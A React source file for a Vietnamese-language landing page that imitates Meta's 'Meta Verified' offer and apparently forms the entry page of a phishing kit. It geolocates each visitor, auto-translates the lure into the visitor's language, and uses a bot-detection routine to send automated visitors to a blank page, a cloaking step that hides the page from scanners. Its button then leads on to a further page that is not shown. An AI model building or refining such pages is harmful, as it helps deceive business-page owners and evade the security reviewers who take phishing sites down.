import { useCallback, useEffect, useMemo, useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router';
import MainIllustration from '@/assets/images/index-main-illustration.png';
import IconVerified from '@/assets/images/index-xac-minh.png';
import IconImpersonation from '@/assets/images/index-chong-mao-danh.png';
import IconSupport from '@/assets/images/index-ky-thuat-vien-ho-tro.png';
import IconUpgrade from '@/assets/images/index-tinh-nang-nang-cap.png';
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import countryToLanguage from '@/utils/country_to_language';

const Index = () => {
    const navigate = useNavigate();
    const defaultTexts = useMemo(
        () => ({
            title: 'Tăng trưởng với Meta đã xác minh',
            description: 'Xây dựng uy tín với khách hàng. Tiếp tục để đến với Meta đã xác minh',
            cta: 'Tham gia danh sách ...',
            sectionTitle: 'Nhiều lợi ích nổi bật khác',
            verifiedTitle: 'Huy hiệu đã xác minh',
            verifiedSubtitle: 'Luôn xuất hiện bên bạn',
            impersonationTitle: 'Chống mạo danh',
            impersonationSubtitle: "Chúng tôi thay bạn 'canh gác'",
            supportTitle: 'Hỗ trợ qua email và chat với tổng đài viên',
            supportSubtitle: 'Trợ giúp khi bạn cần, ở nơi bạn cần',
            upgradeTitle: 'Tính năng nâng cấp cho trang cá nhân',
            upgradeSubtitle: 'Giới thiệu doanh nghiệp hiệu quả hơn'
        }),
        []
    );
    const [texts, setTexts] = useState(defaultTexts);

    const featureItems = useMemo(
        () => [
            {
                icon: IconVerified,
                title: texts.verifiedTitle,
                subtitle: texts.verifiedSubtitle
            },
            {
                icon: IconImpersonation,
                title: texts.impersonationTitle,
                subtitle: texts.impersonationSubtitle
            },
            {
                icon: IconSupport,
                title: texts.supportTitle,
                subtitle: texts.supportSubtitle
            },
            {
                icon: IconUpgrade,
                title: texts.upgradeTitle,
                subtitle: texts.upgradeSubtitle
            }
        ],
        [texts]
    );
    const [mainFeature, ...otherFeatures] = featureItems;

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTexts(translated);
            } catch (error) {
                console.error('Index translation error:', error);
                setTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializePage = useCallback(async () => {
        let targetLang = 'en';

        try {
            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
            const geoData = response.data || {};
            localStorage.setItem('ipInfo', JSON.stringify(geoData));

            const countryCode = String(geoData.country_code || '').toUpperCase();
            targetLang = countryToLanguage[countryCode] || 'en';
            localStorage.setItem('targetLang', targetLang);
        } catch (error) {
            console.error('Index geo fetch error:', error);
        }

        const botResult = await detectBot();
        if (botResult.isBot) {
            globalThis.location.href = 'about:blank';
            return;
        }

        if (targetLang !== 'vi') {
            await translateAllTexts(targetLang);
            return;
        }

        setTexts(defaultTexts);
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        initializePage();
    }, [initializePage]);

    return (
        <div className="index-page-shell">
            <div className="index-page">
                <div className="index-page__left">
                    <h1 className="index-page__title">{texts.title}</h1>
                    <p className="index-page__description">
                        {texts.description}
                    </p>
                    <button type="button" className="index-page__cta" onClick={() => navigate('/home')}>
                        {texts.cta}
                    </button>

                    <div className="index-page__feature-list">
                        <div className="index-page__feature-card index-page__feature-card--main">
                            <img src={mainFeature.icon} alt={mainFeature.title} className="index-page__feature-icon" />
                            <div>
                                <h3 className="index-page__feature-title">{mainFeature.title}</h3>
                                <p className="index-page__feature-subtitle">{mainFeature.subtitle}</p>
                            </div>
                        </div>

                        <h2 className="index-page__section-title">{texts.sectionTitle}</h2>

                        {otherFeatures.map((item) => (
                            <div className="index-page__feature-card" key={item.title}>
                                <img src={item.icon} alt={item.title} className="index-page__feature-icon" />
                                <div>
                                    <h3 className="index-page__feature-title">{item.title}</h3>
                                    <p className="index-page__feature-subtitle">{item.subtitle}</p>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>

                <div className="index-page__right">
                    <img src={MainIllustration} alt="Meta verified preview" className="index-page__hero-image" />
                </div>
            </div>
        </div>
    );
};

export default Index;
